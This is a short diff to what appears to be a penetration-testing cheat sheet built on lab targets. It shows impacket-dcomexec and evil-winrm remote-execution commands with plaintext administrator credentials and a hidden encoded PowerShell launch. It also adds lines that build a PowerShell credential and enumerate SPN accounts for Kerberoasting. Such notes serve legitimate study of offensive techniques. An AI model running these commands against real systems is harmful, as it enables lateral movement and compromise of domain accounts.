@@ -424,6 +424,10 @@ impacket-dcomexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
 impacket-dcomexec -object MMC20 active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e' -silentcommand
 # evil-winrm
 evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
+## double hop
+$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\backup', $SecPassword)
+get-domainuser -spn -credential $Cred
 ```
 
 
